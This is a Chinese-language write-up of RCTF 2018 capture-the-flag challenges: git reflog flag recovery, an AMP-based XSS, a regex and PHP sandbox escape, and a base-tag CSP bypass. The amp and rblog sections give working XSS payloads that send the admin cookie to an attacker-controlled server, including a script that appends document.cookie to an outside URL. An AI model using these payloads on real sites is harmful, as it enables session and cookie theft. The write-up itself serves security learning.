# RCTF 2018
剛打完DEFCON CTF，聽到又有大陸這邊辦的比賽就有來打了，整體上XSS的出題比率挺高的！  

# Misc - git
這次比賽最水的一題，還是留個wp在這好了，觀念是從`.git`還原倉庫的程式碼  
```php
shimaodeMBP:git shimao$ git reflog
	22d3349 (HEAD -> master) HEAD@{0}: checkout: moving from develop to master
	f4d0f6d (develop) HEAD@{1}: reset: moving to f4d0f6d
	f4d0f6d (develop) HEAD@{2}: reset: moving to f4d0f6d
	22d3349 (HEAD -> master) HEAD@{3}: reset: moving to 22d3349a5c6fe45758daba276108137382a01caa
	22d3349 (HEAD -> master) HEAD@{4}: checkout: moving from master to develop
	22d3349 (HEAD -> master) HEAD@{5}: reset: moving to 22d3349a5c6fe45758daba276108137382a01caa
	22d3349 (HEAD -> master) HEAD@{6}: reset: moving to 22d3349a5c6fe45758daba276108137382a01caa
	22d3349 (HEAD -> master) HEAD@{7}: reset: moving to 22d3349a5c6fe45758daba276108137382a01caa
	22d3349 (HEAD -> master) HEAD@{8}: checkout: moving from develop to master
	22d3349 (HEAD -> master) HEAD@{9}: rebase -i (finish): returning to refs/heads/develop
	22d3349 (HEAD -> master) HEAD@{10}: rebase -i (start): checkout 22d3349
	f671986 HEAD@{11}: checkout: moving from master to develop
	22d3349 (HEAD -> master) HEAD@{12}: checkout: moving from develop to master
	f671986 HEAD@{13}: checkout: moving from master to develop
	22d3349 (HEAD -> master) HEAD@{14}: checkout: moving from rctf to master
	f671986 HEAD@{15}: commit: Revert
	f4d0f6d (develop) HEAD@{16}: commit: Flag
	22d3349 (HEAD -> master) HEAD@{17}: checkout: moving from master to rctf
	22d3349 (HEAD -> master) HEAD@{18}: commit (initial): Initial Commit
shimaodeMBP:git shimao$ git reset --hard f4d0f6d
	HEAD is now at f4d0f6d Flag
shimaodeMBP:git shimao$ ls
	HelloWorld.txt flag.txt
shimaodeMBP:git shimao$ cat flag.txt
	RCTF{gIt_BranCh_aNd_l0g}
```
提交flag`RCTF{gIt_BranCh_aNd_l0g}`

# Web - amp
這題用`name`作為GET請求的參數，但是一般的xss卻受到CSP阻饒  
```php
shimaodeMBP:webcocktail shimao$ curl http://amp.2018.teamrois.cn -v

* Rebuilt URL to: http://amp.2018.teamrois.cn/
*   Trying 149.28.139.172...
* TCP_NODELAY set
* Connected to amp.2018.teamrois.cn (149.28.139.172) port 80 (#0)
> GET / HTTP/1.1
> Host: amp.2018.teamrois.cn
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Mon, 21 May 2018 14:13:53 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 1930
< Connection: keep-alive
< X-Powered-By: PHP/7.2.5
< Content-Security-Policy: script-src 'nonce-ad0eab17ed448e21824e6536850f5913' 'strict-dynamic'; style-src 'unsafe-inline'
< Set-Cookie: FLAG=flag_is_in_admin_cookie
< Vary: Accept-Encoding
<
<!doctype html>
<html ⚡>
  <head>
    <meta charset="utf-8">
    <script async src="https://cdn.ampproject.org/v0.js" nonce="ad0eab17ed448e21824e6536850f5913"></script>
    <title>⚡</title>
    <link rel="canonical" href="http://example.ampproject.org/article-metadata.html">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
    <script type="application/ld+json" nonce="ad0eab17ed448e21824e6536850f5913">
      {
        "@context": "http://schema.org",
        "@type": "NewsArticle",
        "headline": "Open-source framework for publishing content",
        "datePublished": "2015-10-07T12:02:41Z",
        "image": [
          "logo.jpg"
        ]
      }
    </script>
    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <style amp-custom>body {background:url(background.jpg) no-repeat;background-size:cover;}html,body,.main{min-height:100vh;width:100%;color:#fff;}.main{align-items: center;display: flex;justify-content: center; flex-direction: column;}.main *{ zoom: 2;}.grecaptcha-badge{display: none}</style>
  </head>
  <body>
      <div class="main">
        <h1>HEY</h1>
        <h3>INPUT YOUR NAME AFTER QUERYSTRING</h3>
      </div>
  </body>
</html>
* Connection #0 to host amp.2018.teamrois.cn left intact
```
1. 解讀上面的CSP發現我們的`<script>`如果沒有`nonce`隨機數就不能執行  
2. 解讀提示會發現這個頁面用的可能是AMP標準  
3. 上面的`set-cookie`header中說`flag`在admin的cookie裡  
結論：我們想辦法用AMP tag來獲取admin`flag`的cookies  
payload:`url?name=<amp-pixel src="http://my_server/?q=CLIENT_ID(FLAG)"></amp-pixel>`  
原本收到的request會長這樣：`?q=flag_is_in_admin_cookie`  
再按下`STOP TRACKING ME`的按鈕之後  
就會得到：`?q=RCTF%7BEl_PsY_CONGRO0_sg-%7d`  
GET FLAG!!  
![](https://github.com/shinmao/CTF-writeups/blob/master/RCTF2018/screenshot/amp.png)  

# Web - r-cursive
這題有兩個關卡:  
1. 繞過regex  
2. 沙箱脫逸  
首先來解讀regex  
```php
/[^\W_]+\((?R)?\)/
```
前面的`[^\W_]`是指任意字但是不能為非字母,非數字,非底線的字元  
後面`(?R)?`就很有意思了,我也是賽後找到教學才懂的,我們要拆解成`(?R)`和`?`兩部分: 我們可以把這個recursive的正則理解成**paste pattern**,然後再套上第二部分的`?`代表0個或1個,整個正則就變成下面這副德性:  
```php
/[^\W_]+\([^\W_]+\([^\W_]+\((?R)?\)\)\)/
```
關於這部分我非常推薦這篇文章[Recursive Regular Expressions](http://www.rexegg.com/regex-recursion.html)  
再來就是第二關的沙箱脫逸  
賽中其實我也在`phpinfo`的頁面花了非常多的時間找線索,無奈與**沙箱逃逸**真的沒有交過手 :cry:  
我可以看到`open_basedir`的路徑是`/var/www/sandbox/xxxxxxxxx/:/tmp/`,`auto_prepend_file`設定的腳本則是`/var/www/sandbox/init.php`  
在這裡我必須依賴的知識點就是`auto_prepend`選項設定執行的腳本可以通過`ini_set('open_basedir',"/var/www/hosts/$hostname/:/tmp/");`來設置`open_basedir`  
所以我們只要改`hostname`應該就可以逃逸沙箱了  
[wp寫得非常詳細](https://xz.aliyun.com/t/2347#toc-2),因此我在這邊只截錄自己的重點

# Web - rblog
網站頁面有post的功能，經過幾次測試之後我們可以推斷`title`的部分有xss的漏洞(content的部分被轉譯得相當乾淨
```php
$ curl -I http://rblog.2018.teamrois.cn/
HTTP/1.1 200 OK
Date: Sat, 19 May 2018 17:42:22 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.5
Referrer-Policy: strict-origin
X-Frame-Options: DENY
Content-Security-Policy: default-src 'none'; script-src 'nonce-00bf5d37284fd8cabb55d18a943b5fc3'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'
Content-Type: text/html; charset=UTF-8
```
接下來是CSP的解讀：  
```php
default-src 'none'; 
script-src 'nonce-00bf5d37284fd8cabb55d18a943b5fc3';
```
我們必須繞過隨機數  
這時我一時興起就把CSP丟進了[google csp evaluator](https://csp-evaluator.withgoogle.com/):  
```php
errorbase-uri [missing]
Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?
```
這個evaluator相當於告訴我們可以用`<base>`繞過，而exploit的概念就是相對路徑...  
在我們的blog post中可以發現幾個引入的js  
```php
<script nonce="10b2226d5736a0e6ba9641afad038c03" src="/assets/js/jquery.min.js"></script>
```
因此如果我們的post中有`<base href="http://xxx/">`，那引入的js也會變成`http://xxx/assets/js/jquery.min.js`。  
這是一個重大的發現，因為如果`xxx`是我們可控的，我們就可以進而偽造一個沒有CSP的`jquery.min.js`！  
開始exploit前我們先整理一下攻擊思路：  
1. 送出帶有`<base>`標籤的post，進而改變要請求的`jquery.min.js`  
2. 官方有個功能，我們report我們的post，而他會去看... 在他看的時候就會對我們的`jquery.min.js`發出請求  
3. 我們開一個端口接收這個請求帶著的cookie就大吉大利囉  

Exploit：  
`title`部分輸入`<base href="http://18.216.228.129:8080/" />`，此ip為我可控的server  
![](https://github.com/shinmao/CTF-writeups/blob/master/RCTF2018/screenshot/rblog.png)  
創建`http://18.216.228.129:8080/assets/js/jquery.min.js`，內容為:  
```php
function hello(){
	location.href="http://18.216.228.129:8000/?"+document.cookie;
}
hello();
```
這時候主動去翻翻我們的blog post，會被直接跳轉到`18.216.228.129:8000`的頁面，同理admin也是一樣，我們只要收到request就可以查到cookie了！
